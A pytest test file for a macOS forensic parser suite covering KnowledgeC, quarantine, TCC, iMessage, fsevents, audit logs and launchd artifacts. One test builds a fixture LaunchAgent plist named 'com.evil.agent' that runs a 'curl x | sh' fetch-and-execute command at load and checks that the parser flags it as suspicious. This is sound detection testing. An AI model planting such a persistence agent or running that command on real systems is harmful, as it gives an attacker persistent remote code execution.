"""Unit tests: macOS parsers."""
from __future__ import annotations

import gzip
import json
import plistlib
import struct
import sys
from collections import Counter

import pytest

from veritas.parsers import (
    app_usage, appfirewall, asl, bsm, fsevents, imessage, knowledgec, launch_agents, launchd_log, notificationcenter,
    quarantine, santa, tcc, unified_log, wifi_log,
)
from veritas.parsers.base import ParserError, Provenance
from veritas.timeline.schema import format_ns


def run(cls, path, **prov):
    p = cls()
    prov.setdefault("evidence_path", str(path))
    events = list(p.parse(str(path), Provenance(**prov)))
    return events, p


def kinds(events):
    return Counter((e.data_type, e.timestamp_desc) for e in events)


def test_knowledgec_1014(corpus):
    ev, _ = run(knowledgec.KnowledgeCParser, corpus / "plaso/macos/knowledgec-10.14.db")
    assert len(ev) == 276
    k = kinds(ev)
    assert k[("macos:knowledgec:application", "Start Time")] == 70
    assert k[("macos:knowledgec:safari", "Start Time")] == 7
    first = ev[0]
    assert first.attrs["stream_name"] == "/app/inFocus" and first.attrs["bundle_identifier"] == "com.apple.loginwindow"
    assert first.timestamp == (565366977985618 + 978307200 * 10**6) * 1000
    safari = [e for e in ev if e.data_type == "macos:knowledgec:safari"]
    assert all(e.attrs["url"] for e in safari) and any(e.attrs.get("title") for e in safari)


def test_knowledgec_1013(corpus):
    ev, _ = run(knowledgec.KnowledgeCParser, corpus / "plaso/macos/knowledgec-10.13.db")
    assert len(ev) == 63
    assert kinds(ev)[("macos:knowledgec:application", "End Time")] == 17
    assert ev[-1].attrs["duration_seconds"] == 5 and ev[-1].attrs["bundle_identifier"] == "com.apple.finder"


def test_quarantine(corpus):
    ev, _ = run(quarantine.QuarantineParser, corpus / "plaso/sqlite/quarantine.db")
    assert len(ev) == 14
    assert ev[0].attrs["agent"] == "Safari"
    assert ev[0].attrs["data"] == "https://dl.google.com/chrome/mac/stable/GGRO/googlechrome.dmg"
    assert ev[0].timestamp == 1373300667020743000


def test_tcc(corpus):
    ev, _ = run(tcc.TccParser, corpus / "plaso/macos/TCC-test.db")
    assert len(ev) == 21
    assert ev[0].attrs["service"] == "kTCCServiceUbiquity" and ev[0].attrs["client"] == "com.apple.weather"
    assert ev[0].attrs["allowed"] is True and ev[0].timestamp == 1590754191 * 10**9


def test_app_usage(corpus):
    ev, _ = run(app_usage.AppUsageParser, corpus / "plaso/macos/application_usage.sqlite")
    assert len(ev) == 5
    assert ev[0].attrs["bundle_identifier"] == "com.apple.Safari" and ev[0].timestamp == 1399488722 * 10**9


def test_notification_center(corpus):
    ev, _ = run(notificationcenter.NotificationCenterParser, corpus / "plaso/mac_notificationcenter.db")
    assert len(ev) == 6
    assert ev[0].attrs["title"] == "Santa" and ev[0].attrs["body"] == "KeePassXC can now be run"
    assert ev[0].attrs["bundle_name"] == "com.google.santagui"
    assert ev[0].timestamp == 1525258758930156000


def test_imessage(corpus):
    ev, _ = run(imessage.IMessageParser, corpus / "plaso/sqlite/imessage_chat.db")
    k = kinds(ev)
    assert k[("imessage:event:chat", "Creation Time")] == 10
    first = ev[0]
    assert first.attrs["imessage_id"] == "447775455555" and first.attrs["is_from_me"] is False
    assert first.attrs["text"].startswith("Hey Kenneth")
    assert first.timestamp == (469908586 + 978307200) * 10**9


def test_imessage_attributed_body_fallback():
    blob = b"\x04\x0bstreamtyped\x81\xe8\x03\x84\x01@\x84\x84\x84\x08NSString\x01\x94\x84\x01+\x05hello\x86"
    assert imessage._attributed_text(blob) == "hello"


def test_fsevents(corpus):
    f = corpus / "plaso/fsevents/fsevents-00000000001a0b79"
    ev, _ = run(fsevents.FseventsParser, f)
    assert len(ev) == 6 and all(e.timestamp is None for e in ev)
    last = ev[-1]
    assert last.attrs["path"] == "untitled folder" and last.attrs["event_identifier"] == 1706837
    assert last.attrs["flag_names"] == ["Renamed", "DirectoryCreated", "IsDirectory"]
    ev, _ = run(fsevents.FseventsParser, f, mtime_ns=1_500_000_000 * 10**9)
    assert all(e.timestamp == 1_500_000_000 * 10**9 for e in ev)
    ev, _ = run(fsevents.FseventsParser, corpus / "plaso/fsevents/fsevents-0000000002d89b58")
    assert len(ev) == 12 and ev[0].attrs["format_version"] == 1 and ev[0].attrs["node_identifier"] is None


def test_fsevents_decompression_cap(tmp_path, monkeypatch):
    page = b"1SLD" + b"\x00" * 4 + struct.pack("<I", 12 + 6 + 12) + b"/a/b\x00\x00" + struct.pack("<QI", 1, 1)
    f = tmp_path / "0000000000000001"
    f.write_bytes(gzip.compress(page * 1000))
    monkeypatch.setattr(fsevents, "MAX_DECOMPRESSED", 1000)
    with pytest.raises(ParserError):
        fsevents.decompress(str(f), cap=1000)


def test_asl(corpus):
    ev, p = run(asl.AslParser, corpus / "plaso/2019.09.26.asl")
    assert p.warning_count == 0
    k = kinds(ev)
    assert k[("macos:asl:entry", "Content Modification Time")] == 318
    assert k[("macos:asl:file", "Creation Time")] == 1
    e = ev[1]
    assert e.attrs["sender"] == "powerd" and e.attrs["facility"] == "com.apple.iokit.power"
    assert e.attrs["computer_name"] == "Deans-MacBook-Pro" and e.attrs["message_identifier"] == 2586


def test_bsm(corpus):
    ev, p = run(bsm.BsmParser, corpus / "plaso/apple.bsm")
    assert len(ev) == 54 and p.warning_count == 0
    first = ev[0]
    assert first.attrs["event_type"] == 45029 and first.timestamp == 1383590180381000000
    assert first.attrs["text"] == ["launchctl::Audit recovery"]
    assert first.attrs["paths"] == ["/var/audit/20131104171720.crash_recovery"]
    ev, p = run(bsm.BsmParser, corpus / "plaso/openbsm.bsm")
    assert len(ev) == 50 and p.warning_count == 1  # one record carries an unsupported token


def test_santa(corpus):
    ev, _ = run(santa.SantaParser, corpus / "plaso/santa.log")
    k = kinds(ev)
    assert k[("santa:execution", "Last Time Executed")] == 44
    assert k[("santa:file_system_event", "Content Modification Time")] == 125
    assert k[("santa:diskmount", "Content Modification Time")] == 22
    ex = next(e for e in ev if e.data_type == "santa:execution")
    assert ex.attrs["decision"] == "ALLOW" and ex.attrs["pid"] == 479 and ex.attrs["user"] == "root"


def test_wifi_log_year_rollover(corpus):
    ev, _ = run(wifi_log.WifiLogParser, corpus / "plaso/wifi.log", year_hint=2013)
    assert len(ev) == 10
    assert format_ns(ev[0].timestamp) == "2013-11-14T20:14:37.123000Z"
    assert format_ns(ev[-1].timestamp).startswith("2014-01-01T01:12:17")
    assert ev[1].attrs["agent"] == "airportd" and ev[1].attrs["function"] == "airportdProcessDLILEvent"
    assert ev[2].attrs["ssid"] == "CampusNet"


def test_appfirewall(corpus):
    ev, p = run(appfirewall.AppFirewallParser, corpus / "plaso/appfirewall.log", year_hint=2013)
    assert len(ev) == 47 and p.warning_count == 0  # incl. the "--- last message repeated ---" line
    assert ev[1].attrs["process_name"] == "Dropbox" and ev[1].attrs["action"] == "Allow TCP LISTEN  (in:0 out:1)"
    assert format_ns(ev[-1].timestamp).startswith("2014-01-01T01:13:23")


def test_launchd_log(corpus):
    ev, _ = run(launchd_log.LaunchdLogParser, corpus / "plaso/macos_launchd.log")
    assert len(ev) == 36609
    assert ev[0].attrs["subsystem"] == "restore-datapartition" and ev[0].attrs["severity"] == "Notice"
    assert ev[0].timestamp == 1686235898987368000


def test_launchd_plist(corpus, tmp_path):
    ev, _ = run(launch_agents.LaunchdPlistParser, corpus / "plaso/plist/launchd.minimal.plist")
    assert ev[0].attrs["label"] == "foo" and ev[0].attrs["program"] == "/usr/bin/true"
    d = tmp_path / "Library" / "LaunchAgents"
    d.mkdir(parents=True)
    f = d / "com.evil.agent.plist"
    f.write_bytes(plistlib.dumps({"Label": "com.evil.agent", "ProgramArguments": ["/bin/sh", "-c", "curl x | sh"],
                                  "RunAtLoad": True, "KeepAlive": {"SuccessfulExit": False}}, fmt=plistlib.FMT_BINARY))
    ev, _ = run(launch_agents.LaunchdPlistParser, f, mtime_ns=1_600_000_000 * 10**9)
    a = ev[0].attrs
    assert a["run_at_load"] is True and a["keep_alive"] == {"SuccessfulExit": False} and a["scope"] == "agent"
    assert a["suspicious"] is True and ev[0].timestamp == 1_600_000_000 * 10**9


def test_launchd_plist_refuses_entities(tmp_path):
    d = tmp_path / "LaunchDaemons"
    d.mkdir()
    f = d / "x.plist"
    f.write_text('<?xml version="1.0"?><!DOCTYPE plist [<!ENTITY a "b">]><plist><dict><key>Label</key>'
                 '<string>&a;</string></dict></plist>')
    with pytest.raises(ParserError):
        list(launch_agents.LaunchdPlistParser().parse(str(f), Provenance()))


def test_background_items(corpus):
    ev, _ = run(launch_agents.BackgroundItemsParser, corpus / "plaso/backgrounditems.btm")
    assert len(ev) == 1
    assert ev[0].attrs["target_path"] == "/Applications/iTunes.app/Contents/MacOS/iTunesHelper.app"


ND = [
    {"timestamp": "2023-06-08 14:51:38.987368-0700", "eventMessage": "hello", "processImagePath": "/usr/sbin/sshd",
     "processID": 42, "subsystem": "com.openssh", "category": "auth", "messageType": "Default", "eventType": "logEvent"},
    {"timestamp": "2023-06-08 14:51:39.000001+0000", "eventMessage": "two", "processImagePath": "/bin/x", "processID": 1},
]


def test_unified_log_ndjson_and_json(tmp_path):
    f = tmp_path / "out.ndjson"
    f.write_text("\n".join(json.dumps(o) for o in ND) + '\nnot json\n{"finished":1}\n')
    ev, p = run(unified_log.UnifiedLogJsonParser, f)
    assert len(ev) == 2 and p.warning_count == 1
    assert format_ns(ev[0].timestamp) == "2023-06-08T21:51:38.987368Z"
    assert ev[0].attrs["subsystem"] == "com.openssh" and ev[0].attrs["process_identifier"] == 42
    g = tmp_path / "out.json"
    g.write_text(json.dumps(ND, indent=2))
    ev2, _ = run(unified_log.UnifiedLogJsonParser, g)
    assert [e.timestamp for e in ev2] == [e.timestamp for e in ev]


@pytest.mark.skipif(sys.platform == "darwin", reason="non-macOS behaviour")
def test_logarchive_unsupported_off_macos(tmp_path):
    d = tmp_path / "system.logarchive"
    d.mkdir()
    f = d / "0000000000000001.tracev3"
    f.write_bytes(b"\x00\x10\x00\x00" + b"\x00" * 60)
    p = unified_log.LogArchiveParser()
    assert p.matches(str(f), f.read_bytes())
    with pytest.raises(ParserError, match="not implemented in pure Python"):
        list(p.parse(str(f), Provenance()))
